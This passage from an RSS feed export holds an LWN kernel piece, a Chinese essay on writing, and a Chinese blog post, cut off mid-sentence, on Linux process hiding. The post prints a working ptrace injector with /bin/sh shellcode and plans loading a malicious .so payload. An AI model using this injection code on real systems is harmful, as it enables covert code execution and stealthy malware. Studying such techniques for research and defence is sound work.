what we have today; they could be smaller,\nwith much of the complicated logic running in separate, user-space\ncomponents.  Whether this is part of Lei's vision for ublk is unknown, and\nthings may never get anywhere near that point.  But ublk is clearly an\ninteresting experiment that could lead to big changes down the line.\nSomething will need to be done about that complete absence of\ndocumentation, though, on the way toward world domination.<br clear=\"all\"></p><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Kernel/Index\">Kernel</a></td><td><a href=\"https://lwn.net/Kernel/Index#Block_layer-Block_drivers\">Block layer/Block drivers</a></td></tr>\n            <tr><td><a href=\"https://lwn.net/Kernel/Index\">Kernel</a></td><td><a href=\"https://lwn.net/Kernel/Index#io_uring\">io_uring</a></td></tr>\n            <tr><td><a href=\"https://lwn.net/Kernel/Index\">Kernel</a></td><td><a href=\"https://lwn.net/Kernel/Index#Releases-6.0\">Releases/6.0</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "https://sspai.com/post/75067",
    "timestampUsec": "1660121041644384",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "找到写作者的位置：如何在满足自身创作欲时也让读者满意",
    "author": ";猴猴说话",
    "published": 1660119180,
    "updated": 1660119180,
    "alternate": [
        {
            "href": "https://sspai.com/post/75067",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p><strong>Matrix 首页推荐</strong> </p><p><a target=\"_blank\" rel=\"noopener noreferrer\" href=\"https://sspai.com/matrix\">Matrix</a>  是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。 </p><p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p><hr><p>最近我写东西时遇到了一些阻碍。这些问题可能你也遇到过。</p><ul><li>想写的内容已经有人写过了，没有写的动力了，怎么办？</li><li>总觉得自己的想法和经历不值得分享出来，去浪费别人的时间。</li><li>花了时间和精力写出来了，但阅读量和反馈都很一般，信心因此被打击。</li></ul><p>总结下来就是，我想写的，别人已经写过了；我不想写的，写着也没意思；想写的，写不清楚，别人看不懂。完了，不想写作了。</p><p>这些问题都会有一个共性矛盾，就是我带入了「别人」这个角色。「别人」已经看过的，「别人」可能不喜欢，担心浪费「别人」的时间。我们去担心「别人」，然后把不想写作的问题归咎在对自己的不自信。</p><p>但这只是一种托辞。</p><p>其实，我们创作欲的敌人不是「不自信」，而是对「面向自己写作」与「面向读者写作」这两个概念的混淆——该面向自己写的时候，念着别人；该面向别人去写的时候，觉得应该坚持自己。</p><ul><li>面向自己写作：为了自己的求知欲、表达欲而写；</li><li>面向读者写作：为了解决读者的需求，写读者关心的内容。</li></ul><p>是为自己写，还是为读者写？之前的我总是在这天平的两端来回摇摆。</p><h2>一、我的写作经历</h2><h3>1.1 面向读者写作</h3><p>最早启发我「写作方法」的是罗辑思维和得到，他们以「通过知识服务，为用户节约时间」的理念打磨内容，当时作为用户，我觉得这样的内容特别受用。而这种以服务的姿态来交付内容的理念，一直影响着我的写作。当时的我，觉得做内容其实就是把别人的知识，用清晰的结构（故事引入-结论先行-展开论证-结尾升华）加上简单易懂的大白话来呈现给读者就行。</p><p>我也用类似的思路对接老板的朋友打磨短内容，制作课程，写知识干货的文章，组建内容小组。当时的我，就觉得做好内容，就是做好内容翻译。但是后来我的想法开始有些转变，因为我遇到了一个同事。</p><p>我们当时一起在帮助公司业务撰写知乎回答，我发现他总能跳出我们原有的知识架构，写出高屋建瓴的深度内容，吸引了不少高净值用户关注。更厉害的是，他总能快速结合知乎的热榜问题，产出深度内容。这给我带来的直接震撼点是，比内容表达本身更重要的，是内容本身的质量。</p><p>知识面广能表现在，对很多事物都能够轻易地建立丰富的概念链接，很容易找到不同事物间的共性，总能够从现有复杂混沌的信息中抽象出更高维度的本质。我也因此意识到自己知识面的不足。</p><h3>1.2 面向自己写作</h3><p>在重启自由写作后，有更充裕的时间去探索不同的内容形式。我清晰地感觉到，因为没有选题的限制，我可以依据我当下最关心、困惑的问题去延伸，然后花时间去查资料、看书，为了解决一个问题，又遇到了另一个问题。慢慢地，我开始按照自己的节奏，激发好奇心，写出了很多自己都意想不到的复杂结构。</p><p>但过度地面向自己写作，就意味着离读者更远。</p><p>播客<a target=\"_blank\" rel=\"noopener noreferrer\" href=\"https://www.xiaoyuzhoufm.com/episode/62bdc58cec92d4d84881cca5\">《网文作者的生活实录》</a>里<sup href=\"\" title=\"《网文作者的生活实录》来自播客：酸奶哥就是薛老师\" footnote-id=\"1\">1</sup>，一个网文作者说，当你完全沉浸，越写越嗨的时候，那你的作品就要扑街了。等你冷却两天，再看这段沉浸式写作的内容，会发现很多地方都需要修改。</p><p>虚构类的作品尚且如此，何况非虚构的说理类内容。</p><p>就在前不久，一些读者的反馈让我从自我沉浸中抽离了出来。有人说文章内容太复杂；有人说，本来感觉很清晰，看完后就迷糊了。我于是开始反思，我是不是太偏向「面向自己写作」了？创作者应该怎么平衡「面向自己」与「面向读者」？</p><h2>二、如何平衡自己与读者</h2><p>经过反复思考后，我发现「面向自己」和「面向读者」并不矛盾。</p><p>其实任何思考和知识本身都是有价值的，不然它也没有被发明出的必要。至于是否对读者有价值，在于你能不能把它与读者当前遇到的问题进行有效关联。</p><p>比如「<a target=\"_blank\" rel=\"noopener noreferrer\" href=\"https://sspai.com/post/74744\">自动化思维</a>」是一个自发、不受控的思维活动。如果不与问题关联，它仅仅是一个心理学的知识。但是它既可以是让我们产生偏见、刻板印象的元凶；也可以是让我们不断反刍过去的痛苦，陷入内耗和焦虑的关键因素。</p><p>而对作者来说，关键不仅是要怎么帮读者建立其与概念之间的链接，更是需要保证写作输出的内在动力。所以，我们既要保证创作动力，还要保证写出的内容有人看，还要克服「已经有人写过」的心理障碍。</p><p>我们在写作时，心里可能会装着某个对象，可能是自己的亲人、朋友、爱人，也可能那个读者是自己。如果引入过去、当下、未来的时间概念，把读者换成不同时空中的自己，那么我们面向的读者就是当下的自己、过去的自己和未来的自己。</p><ul><li>当下的自己：此时此刻正在试图理解当前心理过程的自己；</li><li>过去的自己：时光倒回，还没有现在经历那么丰富的自己；</li><li>未来的自己：时光穿梭，未来某个时刻回过来看的自己。</li></ul><p>写作的步骤可以是：先为当下的自己记上最精彩和激动人心的一笔，然后给过去的自己提供更有用的建议，以及总结出可以参考的经验，给未来的自己做准备。</p><p>面向现在、过去、未来的自己，都分别有侧重，我们一个一个来看。</p><h3>2.1 现在的自己</h3><p>如果让你去描述你眼前一个正在等候地铁的人，或者写你此刻的心理活动，或者去查阅一个公司的历史故事，或了解一个心理学名词的由来，即使是写一篇回顾当天的日记，也写的是当时当刻对那些事件的记忆和感受。去发问，去思考。这些过程本身就脱离不了「当下」。</p><p>而面向自己写作的最大难题，就是你可能总会在该面向自己的时候，处在分心的状态：对过去批判，对未来担忧。无法随心地进入到求知、写作的状态。</p><p>解决这个问题的方法有三步。</p><p><strong>第一步：有触动，立马记</strong>。</p><p>你有没有过错失灵感的时候？如果你没有在第一时间对当时的感受做记录，过两天后，再去回忆和记录，难度就变得很大。因为在当下，你的内心有所触动，然后通过写作去演绎思绪。但这个被触动的时间段是很短的，一般在两天以内，如果过了这个时段，那个被打动的感觉就消散了，成为了过去。所以有了想法得立马记下来，最大限度去还原当时的状况。</p><p><strong>第二步：不评判，只发散</strong>。</p><p>面向自己写作是一种「状态」。我经常在写文章时，看到之前的初稿会感觉毫无头绪，这个时候，我会尝试先写流水账。回看我之前的日记，很多灵感迸发前，都有一些自己莫名其妙的絮叨。这里分享一个比较典型的随心记录。</p><figure><img src=\"https://cdn.sspai.com/2022/08/09/article/29b817cbc8f303e2f49fd974a62ce39d?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"\" data-original=\"https://cdn.sspai.com/2022/08/09/article/29b817cbc8f303e2f49fd974a62ce39d\" referrerpolicy=\"no-referrer\"></figure><p>当你写作的时候，应该全然地投入其中，不要断档，尽可能进入心流，让自己发散起来，不为任何人负责，只要当下的自己写得畅快就行。这时候，文字就从指间里自然流淌而出，你的思维会随着文字的推进持续迸发新的火花，连接上更多从未想过的故事和概念。</p><blockquote><p>自由书写的精髓是自发和诚实。你要快速而不加评判地记录自由联想的内容，记录的时候把大脑放开，不控制、不斟字酌句、不重读、不修改，放任自己去写。</p><p>——《用写作重建自我》</p></blockquote><p>「自由书写」也被用来作为心理疗愈的一种有效方式<sup href=\"\" title=\"黄鑫著.用写作重建自我.机械工业出版社华章分社.2020:15.\" footnote-id=\"2\">2</sup>。它也许很混乱、琐碎、冗长，别人根本看不懂，但能记下你脑中闪现的一切念头——这不仅能有助于身心健康，也能帮你构建出写作的习惯和动力。</p><p><strong>第三步：找问题，引好奇</strong>。</p><p>在你探索自己内心的同时，一些问题就会从脑海里浮现出来，这些问题就会激发你的好奇心，成为你继续探究的动力。</p><p>「面向自己写作」的目的是去理解，用文字让思考流动起来，搞清楚自己当前的课题。至于怎么呈现，不重要，重要的是想清楚；写不出来，是因为想不清楚。想不清楚，就要去找到让自己想不清楚的原因。</p><figure><img src=\"https://cdn.sspai.com/2022/08/09/article/a3e381e2c991ac6dc1a8fbcd88bb3fa6?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"\" data-original=\"https://cdn.sspai.com/2022/08/09/article/a3e381e2c991ac6dc1a8fbcd88bb3fa6\" referrerpolicy=\"no-referrer\"></figure><p>在《<a target=\"_blank\" rel=\"noopener noreferrer\" href=\"https://sspai.com/post/72993\">重新理解「好奇心」：学习动机的自救指南</a>》里，我有分享过，我们对信息的掌握有三个状态：「知道」「不知道」和「舌尖状态」。好奇心比较弱的原因，要么是知道得还太少，浅尝辄止；要么是知道得太全，失去神秘感。让自己处在「舌尖状态」，好奇心才会被完全激发。</p><h3>2.2 过去的自己</h3><p>如果说面向「现在的自己」时要尽可能发散，想到什么写什么。在面向「过去的自己」时，就要尽可能收敛和批判。</p><h4>2.2.1 克服知识的诅咒</h4><p>为什么要给过去的自己写？因为我们在一定程度上，只能去解决和自己经历相似的人的问题，我们能给的帮助都是基于我们这段所见所闻、所思所想。而读者其实就是「过去的自己」，他们对「现在的自己」经历过什么一无所知。</p><p>你可以找身边人做一个小实验：先在头脑里唱一首歌，然后用手拍桌的方式把歌词拍出来。不管你拍得再用心、再精准。对方听到的都是枯燥的「哒哒哒哒哒哒」。「知识的诅咒」让人们总是高估别人对自己的理解程度。所以我们常常挂在嘴边的一句话是「你怎么还不明白」。</p><p>面对过去的自己时，最需要克服的就是知识的诅咒，即假设对方对此一无所知。</p><h4>2.2.2 与读者平等对话</h4><p>为什么姿态很重要？</p><p>刘润在《<a target=\"_blank\" rel=\"noopener noreferrer\" href=\"http://mp.weixin.qq.com/s?__biz=MjM5NjM5MjQ4MQ==&amp;mid=2651680139&amp;idx=1&amp;sn=c68b81593d1418091ea8837d4577b408&amp;chksm=bd1036c58a67bfd319a067f25422e6852e04cf353d5c58828edf2c689333f18ae49e5eb451a7&amp;mpshare=1&amp;scene=1&amp;srcid=0731tF4ma1BTsNA3yf42rfDv&amp;sharer_sharetime=1659247225035&amp;sharer_shareid=86d1e0d22a768670375a075ccb669de0#rd\">28 年多写作心法</a>》里<sup href=\"\" title=\"《请笑纳：我这28年的写作心法，全部都在这里了》——刘润\" footnote-id=\"3\">3</sup>，提到了「对象感」，就好像作者正坐在读者对面，像老熟人一样地分享自己的观点。对象感的背后其实是一种写作姿态。即你在写作的时候，既不会居高临下地好为人师，也不用谄媚地讨好读者；而是以平等的姿态，把读者当次第一次来这里的游客，发自内心地介绍。</p><p>我之前在读史蒂芬·平克的《风格感觉》时，对于书中提到的「古典风格」总有一个疑问：既然写作即思考，那为什么能做到在写之前就胸有成竹？难道不应该是一边写一边思考吗？</p><p>其实古典风格要强调的是一种了然于胸的「姿态」。不管你写的时候多么纠结，在查资料的时候多么痛苦，这些都不该让读者去感受到。</p><p>其实，这就是一种「伪装」，把复杂的推导、庞大的碎片信息都自己消化，只呈现读者能看懂的部分。</p><p>再复杂的公式和推导过程，都没有必要在文章中完全呈现出来，而是以激活读者的视觉感官为目标，和读者平等地进行对话。</p><p>以「导游」来做类比，古典风格就是让游客感觉「这里我很熟」，但其实在引导游客之前，你已经来这里很多遍，对景点烂熟于心了。</p><h4>2.2.3 对内容做减法，突出主线</h4><p>写文章如同雕塑一样，一直在做减法，把不要的去掉，剩下的就是这篇文章真正想表达的。</p><p>我们脑海里的感受、存在的经验太多，但是想在有限的字数和时间内，只能讲清楚其中一小部分。要么，就花更大的篇幅和时间，做更全面和系统的整理；要么，就砍掉其它的细枝末节，给读者呈现相对纯粹的上下文、问题和答案。</p><p>而砍掉其它令自己兴奋的「思考」是需要勇气和决心的，因为要想写得好、写得深入，就要尽可能发散和抽象，这样也难免偏题。所以需要定主线，然后判断并去掉和主线不相干的内容，即使它是你是特别想要写的部分。</p><p>如古典风格倡导的「不用论证，而是直接展示，让读者看见」。</p><p>即使不知道这些背后的数学演算过程，也能知道的一些概念、原理、知识。古典风格常见于科普文和书籍中，写作目的是为了让没有专业知识储备的读者，也能看到你所见，而非让他搞懂事物背后的复杂原理。</p><p>就好比我生产了一个照相机给你使用。我只需要跟你说，这个照相机能有什么用，以及怎么使用它拍照，而不需要告诉你镜头的成像原理、相机内电路的设计路径。</p><h4>2.2.4 让内容更具象</h4><p>高手既能做到将感受的细节完全传达，又能兼顾将复杂的事情拆解成简单的分类；既能巧妙运用各种类比、故事、案例来让「过去的自己」深入理解，又能给出精准的符号，对这些难以言喻的道理进行概括和抽象，给人眼前一亮、记忆深刻之感。</p><p>这就要聊到塞缪尔·早川提出的「抽象阶梯」。</p><figure><img src=\"https://cdn.sspai.com/2022/08/09/article/df76c4f3d69f4be7ea3fc9c1fe318c01?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"\" data-original=\"https://cdn.sspai.com/2022/08/09/article/df76c4f3d69f4be7ea3fc9c1fe318c01\" referrerpolicy=\"no-referrer\"></figure><p>阶梯的最高层对应的是一些宏大的抽象词汇，比如国家、自由、价值、增长；阶梯的底层对应的是具象的词，比如北京天安门、自行车、5 元一袋的薯片、环比增长 20% 的销售额。</p><p>再举个例子，说「一个音乐播放器的内存很大」，这处在偏抽象层的位置，再具象一些就是「5 GB 的内存」，再具象一些就是「把 1000 首歌装进口袋」。</p><p>而在写文章时，一直停留在最高层（抽象层）的话，讲出的内容就容易「假大空」，让人摸不着头脑；而如果一直停留在最底层（具象层），就会像老太婆的裹脚布又臭又长。只有灵活穿插地运用，写出的内容才会既生动又深刻。</p><p>但仅仅是让内容更具象还是不够，我们还需要去抽象阶梯的顶端看看，怎么让「未来的自己」能更好地回忆和运用。</p><h3>2.3 未来的自己</h3><p>如开头提的那个问题：想写的内容已经有人写过了，没有写的动力了，怎么办？</p><p>你担心的是有人写过吗？不，你担心的是有读者已经看过和知道你想写的知识点。别人既然都已经知道了，还干嘛还要写一遍？</p><p>这个问题就好像在问，未来的自己一定知道比现在的自己多，那现在还有必要写给未来吗？</p><p>有必要。因为遗忘是人的天性。</p><h4>2.3.1 人们喜欢遗忘的原因</h4><p>人会不断学习和接收新的信息，也需要花费脑力去处理和加工，如果大脑把全部资源都用于记忆了，那就没有资源去处理新知识了。</p><p>都说太阳下没有新鲜事，我还发现我写的大部分观点和知识，其实已经有很多人写过，但都是基于个人经验进行输出的，虽然知识、内容相近，但是经验和案例不一样，运用的场景不一样，与其它概念的串联方式不一样，其作用就是在合适的时间去帮读者去重温这些知识和经验，让他们结合近期的经验有不一样的体悟。</p><p>也因为人们喜欢遗忘，所以我们除了需要积累大量的案例和体悟，还需要对「未来的自己」设计出让人印象深刻的「咒语」——建立分类。</p><h4>2.3.2 建立分类</h4><p>人虽然容易遗忘具体的信息，但是会对信息的分类很敏感。我们的记忆被分为「短时记忆」与「长时记忆」。通过短时记忆，对信息进行加工、分类，形成「分类」。大脑记住分类后，为了优化内存，就会丢掉辅助记忆模型的具体信息。</p><p>比如，一个记忆被清空的科学家要为自己建立性别的分类，于是他就去测量一些男女样本的头发长度后，发现很多女生的头发比男生更长，会初步把结论抽象为「头发长」的是女性，而忽略掉之前测量过的头发具体是有多少厘米。随后，科学家发现，有的女性头发也很短，于是他又开始去寻找其它具体的特征，他又发现了女生的身形普遍都纤瘦。「身形」又成为了他判断性别的其中一个分类的变量。</p><p>为了认清性别的分类，需要建立新的分类，如长发、中发、短发；高、矮、胖、瘦。然后在大脑记忆中进行加深和巩固。</p><p>同样，在写作和笔记时，我们也需要去为「未来的自己」建立清晰的结论，帮助未来的自己更有效地分类和储存，以便于其高效提取信息。用「抽象阶梯」来看，建立分类就是通过对数据、案例、故事的共性进行提炼和归纳，最后构建出大脑更容易记忆的抽象分类。</p><p>那该如何构建分类？其实我们完全可以站在巨人的肩膀上。白天与黑夜、长期与短期、理性与感性、需要与喜欢、强与弱、是与否……前人已经帮我们做好了分类，我们完全可以基于这些分类，去理解现实中遇到的问题。</p><p>就如同你正在看的这篇文章，我使用的主要是两个分类：「自己与他人」和「过去、现在、未来」。我想表达的内容再复杂、混乱，一经分类的筛选器，都会变得更清晰、容易记忆。</p><h4>2.3.3 分类的陷阱</h4><p>然而分类、概念也存在陷阱，正义与邪恶，不是非此即彼。</p><p>我之前参加过一个学习社群，感觉群里的人虽然很好学，但是群里聊天有时会滥用各种大词去判断和评价别人的事，用概念和分类去定义一个人的存在。</p><p>比如，如何定义工作中的「抗压」？连续一个月从早干到晚，高强度工作算吗？如果有人把这样的一个分类用来定义人，如果没达到就是「不抗压者」，这就叫滥用分类去攻击别人。每个人对压力的阈值不一样，对工作的理解和选择也不一样。如果相互认同这个标准，便可以一起共事；如果不认同，或接受不了，也不用因此去否定自己，给自己贴上「不抗压」的分类标签。</p><p>回到写作的话题，在分享「关键概念」时，我的目的都是试图去找到看似互斥的概念组里，那根模糊的界限。</p><p>你如果看过我几篇文章，就会发现我经常使用类似于《如何逃离 XX 的陷阱》的标题格式。其原因是，概念常会帮助我们对认识事物，但是它也会左右我们的认知，让我们陷入各种认知偏误里。我能做的就是先聊这个概念的常规含义，然后挖掘和探寻它的适应边界，最在边界内讨论它应该如何使用。分类本身不重要，重要的是你需要让自己保持对事物的「灰度认知」，以辩证的眼光去看清被人嘴里的分类和定义。</p><p>分类应该成为我们了解真实世界的阶梯，它不该遮蔽我们，而应该帮助我们产生更多的问题，勾引出我们的好奇心和进一步探索世界的欲望。</p><h2>三、结语</h2><p>写作既让人愉悦，又让人痛苦。说它愉悦，是因为在面向「现在的自己」时，我们能抒发自己所想，畅快。说它痛苦，因为我们要面向「过去的自己」，尽可能把复杂观点、庞杂信息捏成读者喜欢的模样，然后传递出去。</p><p>但平衡自己与读者的难点在于对状态的把控，我们无法在沉浸创作的时候去考虑读者的喜好，也不得不为了让文章观点更清晰，而砍掉一些无关但想要表达的内容。</p><figure><img src=\"https://cdn.sspai.com/2022/08/09/article/62c3167ffee6921ec1e312e98f6c182c?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"\" data-original=\"https://cdn.sspai.com/2022/08/09/article/62c3167ffee6921ec1e312e98f6c182c\" referrerpolicy=\"no-referrer\"></figure><p>当我们尝试以导游的姿态，平等地与读者进行交流时，也需要更多的耐心去逐一介绍，假设读者是第一次来到这个知识领域。</p><p>面对过去的自己时，在抽象阶梯的底部，用类比、故事、案例把观点具象化；面向未来的自己时，在抽象阶梯顶部，用分类去加深和巩固其记忆，以便于其调用。</p><p>最后一个问题：我们写作的目的到底是啥？</p><p>塞缪尔·早川在《语言学的邀请》中给出了答案：</p><blockquote><p>作家借助语言将其经验和态度整理出来，从而在读者心中产生作用，使读者也能把其个人经验和态度略事整顿。经过这番整顿，读者的内心也就可以变得略微整齐些。</p></blockquote><p>我感觉自己就像读者的「思维整理师」，读者的内心深处，已经有不少分类好的信息，也有一些未经分类的散落的碎片信息，我想做的就是帮助读者探索事物分类的边界，让他们的内心因此明晰一些。</p><p>感谢你能耐心看到这里，希望我的经历、思考和总结，能对你产生一些影响，帮你在写作的路上，多迈出一步。</p><p>感谢阅读，如果你不想错过我的更新，欢迎订阅我的 <a target=\"_blank\" rel=\"noopener noreferrer\" href=\"https://housirui.zhubai.love/\">newsletter</a>。</p><h4>关联文章</h4><ul><li><a target=\"_blank\" rel=\"noopener noreferrer\" href=\"https://sspai.com/post/72993\">重新理解「好奇心」：学习动机的自救指南</a></li><li><a target=\"_blank\" rel=\"noopener noreferrer\" href=\"https://sspai.com/post/74213\">笔记太多太零碎？奉上我的写作秘密武器</a></li><li><a target=\"_blank\" rel=\"noopener noreferrer\" href=\"https://sspai.com/post/74744\">如何摆脱时间的心理陷阱？</a></li></ul><p>&gt; 暑期征文 <a target=\"_blank\" rel=\"noopener noreferrer\" href=\"https://sspai.com/post/74751\">数字文具盒</a> 火热征稿中，分享学习方法，拿走现金奖励 🧑🎓</p><p>&gt; 实用、好用的 <a target=\"_blank\" rel=\"noopener noreferrer\" href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>"
    },
    "origin": {
        "streamId": 28,
        "title": "少数派",
        "htmlUrl": "https://sspai.com/",
        "feedUrl": "https://rsshub.black-desk.cn/sspai/index"
    }
},
{
    "id": "https://9bie.org/index.php/archives/822/",
    "timestampUsec": "1660193526434906",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Linux下进程隐藏 二 -- 进程注入（So注入）",
    "author": ";⑨BIE",
    "published": 1637146860,
    "updated": 1637146860,
    "alternate": [
        {
            "href": "https://9bie.org/index.php/archives/822/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h1>前言</h1><p>因为我写文章是边研究边写，而不是完全研究完之后写一份报告总结（个人习惯原因）。。所以文章很大篇幅都在记录我的思路的思想过程，同时也可以看到很多思路的改变，经典昨晚想到的东西写下来然后第二天早上就被自己否定了。。当然你也可以说是水就是了hhhhh。。。。</p><p>三年过去了，想着18年发了一篇 。那时候俺拥有者许多局限性以及很多的局限性和对linux操作的不熟悉性，所以对对这些操作基本只停留在表面浅显的理解，并没有深入的进行一些研究，比如内存上的啊或者是其他的。</p><p>所以这次趁着实习晚自习带班的空闲时间，研究研究一下linux的注入技术。</p><p>Linux和Windows不一样的是，Linux拥有良好的代码，良好的文档以及良好的设计接口。不像windows，闭源，二十年的混乱接口以及可有可无的文档。Linux的好处就是遇事不决看代码。</p><p><strong>先说目标，我们的目标是类似于windows下DLL注入一般，制作一个通用注入器，把我们的SO文件方便的注入到其他进程之中。</strong></p><p>首先我们先从简单的开始，有请我们的有且仅有一位的嘉宾（WINDOWS你看看你）</p><h1>ptrace</h1><pre><code>ptrace is a system call found in Unix and several Unix-like operating systems. By using ptrace (the name is an abbreviation of \"process trace\") one process can control another, enabling the controller to inspect and manipulate the internal state of its target.\n</code></pre><p>文档定义：<a href=\"http://man7.org/linux/man-pages/man2/ptrace.2.html\">http://man7.org/linux/man-pages/man2/ptrace.2.html</a></p><p>根据文档定义，这玩意基本就类似于一个OD一样，能很方便的让我们附加 调试 修改一个其他程序。<br>于是乎，我们可以很方便的暴力挖空进程写一个shellcode进去。<br>于是乎，第一个版本的注入操作如下</p><ul><li>ATTACH进程</li><li>接管进程</li><li>暴力往进程内存中写入我们的shellcode</li><li>修改进程的rip指向我们的Rip</li><li>运行shellcode</li></ul><p>直接参考<a href=\"https://kevien.github.io/2018/01/28/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/\">Linux下进程注入</a>这里的代码</p><pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;sys/ptrace.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/user.h&gt;\n#include &lt;sys/reg.h&gt;\nunsigned char shellcode[] = \"\\xf7\\xe6\\x50\\x48\\xbf\\x2f\\x62\\x69\"\n                             \"\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x48\\x89\"\n                             \"\\xe7\\xb0\\x3b\\x0f\\x05\";\nint inject_data (pid_t pid, unsigned char *src, void *dst, int len)\n{\n  int      i;\n  uint32_t *s = (uint32_t *) src;\n  uint32_t *d = (uint32_t *) dst;\n\n  for (i = 0; i &lt; len; i+=4, s++, d++)\n    {\n      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; 0)\n        {\n          perror (\"ptrace(POKETEXT):\");\n          return -1;\n        }\n    }\n  return 0;\n}\n\nint main (int argc, char *argv[])\n{\n        pid_t                   target;\n        struct user_regs_struct regs;\n        int                     syscall;\n        target = atoi (argv[1]);\n        if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) &lt; 0)\n        {\n                 perror (\"ptrace(ATTACH):\");\n                 exit (1);\n        }\n        printf (\"+ Waiting for process...\\n\");\n        //wait (NULL);\n        printf (\"+ Getting Registers\\n\");\n        if ((ptrace (PTRACE_GETREGS, target, NULL, &amp;regs)) &lt; 0)\n        {\n                perror (\"ptrace(GETREGS):\");\n                exit (1);\n        }\n\n        printf (\"+ Injecting shell code at %p\\n\", (void*)regs.rip);\n\n        int SHELLCODE_SIZE = sizeof(shellcode);\n        printf(\"+ SHELLCODE size = %d\\n\",SHELLCODE_SIZE);\n        inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);\n        regs.rip += 2;\n        printf (\"+ Setting instruction pointer to %p\\n\", (void*)regs.rip);\n        if ((ptrace (PTRACE_SETREGS, target, NULL, &amp;regs)) &lt; 0)\n        {\n                perror (\"ptrace(GETREGS):\");\n                exit (1);\n        }\n        printf (\"+ Run it!\\n\");\n\n        if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) &lt; 0)\n        {\n                perror (\"ptrace(DETACH):\");\n                exit (1);\n        }\n  \n        return 0;\n}\n</code></pre><p>很轻松的就注入成功了。直接从源程序变成我们的接管程序（随手找了一段shellcode）<br><img src=\"https://9bie.org/usr/uploads/2021/11/871071566.png\" alt=\"1.png\" title=\"1.png\"></p><p>但是接下来还有一个问题。虽然我们成功的注入了我们的程序，但是源程序的功能也已经被我们破坏了</p><p>十分类似于windows下创建一个空壳Svchost.exe，然后里面跑着我们的进程，一般对于windows来说这样似乎可以，然而这是linux，我们的目的应该看看能不能在此基础上恢复原有的流程。</p><p>实际上，恢复原有的流程的进程功能理论上也十分简单。类似于windows的API HOOK，直接write地址之后，在此之前我们只需要把数据保存下来，等我们shellcode执行完毕之后再把保存的数据写回去然后让RIP回到原位再次执行似乎不就可以了？<br>然而这时候有一个问题，那就是我们不知道我们的shellcode如何运行结束。同时有时候我们shellcode可能并不需要结束，直接等待shellcode结束可能会永无天日。所以我们需要必要的对shellcode进行一些改造。最典型的改造就是多线程话，多线程载入运行我们需要的负载。</p><p>以及，同时，直接交由shellcode进行多线程操作可能需要对shellcode操作的要求十分的高，并且不同平台间的各种问题，我们需要尽量让shellcode足够精简。因此，最好的办法就是把多线程这个操作移动到其他负载中，也就是我们的SO文件。</p><p>我们shellcode只需要加载SO文件，然后SO文件使用多线程启动我们的恶意负载。然后再把程序交还给源程序，恢复原本数据，继续执行。</p><p>操作如下：</p><ul><li>ATTACH进程</li><li>接管进程</li><li>备份原本RIP的数据</li><li>进程内存中覆盖我们的shellcode</li><li>修改进程的rip指向我们的Rip</li><li>运行shellcode</li><li>shellcode加载SO文件</li><li>So文件多线程运行我们的负载</li><li><strong>还原原本数据</strong></li><li>执行原本数据</li></ul><p>上面内容看似美好，然而还有一个问题。程序加载完So之后，恢复原本数据，如何恢复，恢复在哪里，是shellcode直接加载恢复还是由我们的注入程序恢复</p><p>不过在此之前，就涉及到我们第二个目标--shellcode编写</p><h1>Linux下shellcode编写</h1><p>在完成上面注入器之前，我们得先整一个加载so的shellcode。</p><p>和windows下调用API不通，windows下是通过寻找NTKERNEL的基址，然后在通过固定的偏移寻址来调用API的</p><p>而linux的API则是直接使用系统调用号就行。不需要直接暴力的在内存中寻址偏移调用。</p><p>但是我们要求加载so的dlopen是属于第三方lib库下面，并不是直接系统调用号，还是得回归windows的方式来寻址</p><p>大概思路就是</p><ul><li>本地程序dlopen函数地址-本地程序dl模块基地址=偏移地址</li><li>寻找源dl模块及地址+偏移地址=远程dlopen函数地址</li></ul><p>函数地址直接就能拿。基地址可以从/proc/pid/maps中寻找。</p><p><strong>远程程序没有加载ld模块找不到模块基址怎么办</strong></p><p>同时还有一个问题，按照之前的设想我们直接往当前IP的地址写入我们完整的shellcode运行，然后再还原回来就行，然而，可执行段在内存中的排列可能是<strong>不连续的</strong>，因此就会遇到一个问题，当前IP可执行的区块大小不够塞下我们全部的shellcode。。虽然我们的shellcode可能从原理上来说足够小，但是总会有意外。</p><p>于是乎接下来就有两个选择</p><ul><li>寻找内存中足够大的可执行区域，在那里写入我们的shellcode并还原</li><li>寻找libc.so的基址，然后找到mmap手动申请一片区域</li></ul><p>寻找区域的话，重点就是寻找整个空间都没有连续的，完整的大小能刚好塞下我们的shellcode，当然对于不连续空间也有解决办法，相信诸位在做ctf什么遇到很多了，各种ROP都难不倒大家这种不连续内存多写几个jmp应该就完事，但是对我这种菜鸡来说就算了还是懒得写。</p><p>当然不连续空间好解决。。更难解决的可